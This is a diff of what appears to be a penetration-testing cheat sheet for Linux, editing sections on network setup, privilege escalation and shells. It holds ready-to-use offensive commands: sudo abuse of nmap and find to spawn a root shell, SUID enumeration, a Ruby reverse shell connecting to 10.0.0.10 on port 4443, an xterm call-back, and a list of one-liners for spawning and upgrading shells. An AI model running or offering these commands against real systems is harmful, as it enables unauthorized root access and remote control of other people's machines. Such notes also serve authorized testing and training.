@@ -142,20 +142,21 @@ route add default gw <IP>            Set gateway
 
 /etc/network/interfaces              Set a static IP address
 iface eth0 inet static
-address 192.168.2.10
+address 10.0.3.5
+network 10.0.3.0
 netmask 255.255.255.0
-network 192.168.2.0
-broadcast 192.168.2.255
-gateway 192.168.2.1
+broadcast 10.0.3.255
+gateway 10.0.3.1
 
 /etc/init.d/networking restart       Restart networking
 ------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
-- Automated scripts
+- Automated scripts.
 enum4linux -a <target IP>
 LinEnum                                   https://github.com/rebootuser/LinEnum
+linuxprivchecker.py
 lynis audit system remote <target IP>
 
 - sudoers
@@ -163,6 +164,9 @@ cat /etc/sudoers                          Contains the rules that users must fol
                                           Example: the user lee has root privs when running nmap
 echo "os.execute('/bin/sh')" > test.nse
 sudo -u lee nmap --script=test.nse
+
+-find
+sudo find /home -exec /bin/bash \;        Escalate to a root shell
 
 - Check for binaries with the Sticky bit, SUID, and GUID.
 find / -perm -1000 -type d 2>/dev/null    Sticky bit - only the owner of a directory or a file can delete or rename.
@@ -188,15 +192,15 @@ find / -perm -o+w -type d 2>/dev/null     World-writeable folders
 find / -perm -o+x -type f 2>/dev/null     World-executable files
 find / -perm -o+x -type d 2>/dev/null     World-executable folders
 
-- Check for world-writeable & world-executable folders
+- Check for world-writeable & world-executable folders.
 find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
 
 - Check for files owned by no owner.
 find /dir -xdev \( -nouser -o -nogroup \) -print
 
 - Cron jobs
-crontab -l                           Check for entries
-ls -l /etc/cron*                     Scheduled cron jobs
+crontab -l                                Check for entries
+ls -l /etc/cron*                          Scheduled cron jobs
 
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
@@ -279,19 +283,6 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",4443).to_i;exec sprintf("/bin/sh -
 xterm -display 10.0.0.10:1           target - it will connect back to you on TCP port 6001.
 Xnest :1                             attacker - catch the incoming xterm, start an X-Server.
 xhost +targetIP                      attacker - authorise the target to connect to you.
-
-- Upgrade to a full TTY session.
-Python         python -c 'import pty; pty.spawn("/bin/sh")'
-sh             echo os.system('/bin/bash')
-sh             /bin/sh -i
-Perl           perl —e 'exec "/bin/sh";'
-Perl           exec "/bin/sh";
-Ruby           exec "/bin/sh"
-Lua            os.execute('/bin/sh')
-Within IRB     exec "/bin/sh"
-Within vi      :!bash
-Within vi      :set shell=/bin/bash:shell
-Within nmap    !sh
 ------------------------------------------------------------------------------------------------------
 
 # Screen
@@ -431,6 +422,21 @@ OS X                                 Applications > VNC Viewer: localhost:5901
 VNC                                  Right click on the Desktop > Open Terminal Here
 
 Remote Kali                          vncserver -kill :1
+------------------------------------------------------------------------------------------------------
+
+# Upgrade to a full TTY session
+
+Python                               python -c 'import pty; pty.spawn("/bin/bash")'
+sh                                   echo os.system('/bin/bash')
+sh                                   /bin/sh -i
+Perl                                 perl —e 'exec "/bin/sh";'
+Perl                                 exec "/bin/sh";
+Ruby                                 exec "/bin/sh"
+Lua                                  os.execute('/bin/sh')
+Within IRB                           exec "/bin/sh"
+Within vi                            :!bash
+Within vi                            :set shell=/bin/bash:shell
+Within nmap                          !sh
 ------------------------------------------------------------------------------------------------------
 
 # User Accounts
